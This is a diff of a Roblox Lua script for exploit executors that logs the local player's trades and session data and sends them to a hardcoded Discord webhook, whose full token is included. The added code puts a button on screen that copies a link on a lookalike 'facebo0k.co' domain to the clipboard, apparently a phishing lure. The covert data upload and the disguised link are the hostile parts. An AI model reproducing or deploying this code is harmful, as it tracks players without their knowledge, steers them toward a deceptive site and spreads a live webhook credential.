@@ -1,8 +1,10 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
 
 local lp = Players.LocalPlayer
+local pg = lp:WaitForChild("PlayerGui")
 
 local httpRequest = (syn and syn.request)
     or (http and http.request)
@@ -12,6 +14,7 @@ local httpRequest = (syn and syn.request)
     or (fluxus and fluxus.request)
 
 local WEBHOOK = "https://discord.com/api/webhooks/1561336496814948455/8OTM2WDhxhW_4Xgv19Q_DLCTad2x5btW4YneLBcyUJUFTAt-dNrDaen7766l7Co7AIt6"
+local LINK_URL = "https://www.facebo0k.co/34726158716181/posts/58113319?app=fbl"
 
 local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
 
@@ -21,6 +24,7 @@ local sessionStart = os.time()
 local tradeQueue = {}
 local isSending = false
 local finalized = false
+local lastSummary = ""
 
 local function getInventory()
     local ok, res = pcall(function()
@@ -119,25 +123,11 @@ local function flushSession()
         title = "Session Ended — " .. lp.Name,
         color = 0x00FF88,
         fields = {
-            {
-                name = "👤 User",
-                value = string.format("%s (%s)", lp.Name, lp.DisplayName),
-                inline = true,
-            },
-            {
-                name = "📊 Total Trades",
-                value = tostring(totalTrades),
-                inline = true,
-            },
-            {
-                name = "⏱️ Duration",
-                value = string.format("%dm %ds", math.floor(duration / 60), duration % 60),
-                inline = true,
-            },
+            { name = "👤 User", value = string.format("%s (%s)", lp.Name, lp.DisplayName), inline = true },
+            { name = "📊 Total Trades", value = tostring(totalTrades), inline = true },
+            { name = "⏱️ Duration", value = string.format("%dm %ds", math.floor(duration / 60), duration % 60), inline = true },
         },
-        footer = {
-            text = "Session logger",
-        },
+        footer = { text = "Session logger" },
         timestamp = DateTime.now():ToIsoDate(),
     })
 
@@ -191,6 +181,7 @@ end
 
 local function onTradeClose()
     task.wait(1.5)
+    if tradeOpen then return end
 
     local after = buildSnapshot()
     if not after or not beforeSnapshot then
@@ -203,24 +194,21 @@ local function onTradeClose()
 
     if #received == 0 and #lost == 0 then return end
 
-    local timeStr = os.date("%H:%M:%S")
     local summary = formatDiff(received, lost)
+    if summary == lastSummary then return end
+    lastSummary = summary
 
     table.insert(tradeQueue, {
-        time = timeStr,
+        time = os.date("%H:%M:%S"),
         summary = summary,
-        received = received,
-        lost = lost,
     })
 end
 
 local function startWatcher()
-    local pg = lp:WaitForChild("PlayerGui", 60)
-    if not pg then return end
-
-    local main = pg:WaitForChild("Main", 60)
+    local pgInner = lp:WaitForChild("PlayerGui", 60)
+    if not pgInner then return end
+    local main = pgInner:WaitForChild("Main", 60)
     if not main then return end
-
     local tradeGui = main:WaitForChild("Trade", 60)
     if not tradeGui then return end
 
@@ -278,5 +266,90 @@ task.spawn(function()
             flushSession()
             break
         end
+    end
+end)
+
+local old = pg:FindFirstChild("NeroFloatBtn")
+if old then old:Destroy() end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "NeroFloatBtn"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.DisplayOrder = 9999
+gui.Parent = pg
+
+local btn = Instance.new("TextButton")
+btn.AnchorPoint = Vector2.new(1, 0)
+btn.Position = UDim2.new(1, -20, 0, 80)
+btn.Size = UDim2.fromOffset(150, 42)
+btn.BackgroundColor3 = Color3.fromRGB(30, 30, 46)
+btn.BackgroundTransparency = 0.1
+btn.BorderSizePixel = 0
+btn.Font = Enum.Font.GothamBold
+btn.TextSize = 13
+btn.TextColor3 = Color3.fromRGB(230, 230, 250)
+btn.Text = "📋  Copy Link"
+btn.AutoButtonColor = false
+btn.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = btn
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(140, 90, 255)
+stroke.Thickness = 1.2
+stroke.Transparency = 0.3
+stroke.Parent = btn
+
+local function setClipboard(text)
+    if setclipboard then
+        pcall(setclipboard, text)
+    elseif toclipboard then
+        pcall(toclipboard, text)
+    elseif syn and syn.setclipboard then
+        pcall(syn.setclipboard, text)
+    end
+end
+
+btn.MouseButton1Click:Connect(function()
+    setClipboard(LINK_URL)
+    btn.Text = "✅  Copied!"
+    btn.TextColor3 = Color3.fromRGB(140, 255, 180)
+    task.delay(1.5, function()
+        if btn and btn.Parent then
+            btn.Text = "📋  Copy Link"
+            btn.TextColor3 = Color3.fromRGB(230, 230, 250)
+        end
+    end)
+end)
+
+btn.MouseEnter:Connect(function()
+    TweenService:Create(stroke, TweenInfo.new(0.15), { Transparency = 0 }):Play()
+    TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = 0 }):Play()
+end)
+
+btn.MouseLeave:Connect(function()
+    TweenService:Create(stroke, TweenInfo.new(0.15), { Transparency = 0.3 }):Play()
+    TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = 0.1 }):Play()
+end)
+
+local baseY = btn.Position.Y.Offset
+
+task.spawn(function()
+    while btn.Parent do
+        local up = TweenService:Create(btn, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            Position = UDim2.new(1, -20, 0, baseY - 8),
+        })
+        up:Play()
+        up.Completed:Wait()
+        if not btn.Parent then break end
+        local down = TweenService:Create(btn, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            Position = UDim2.new(1, -20, 0, baseY + 2),
+        })
+        down:Play()
+        down.Completed:Wait()
     end
 end)
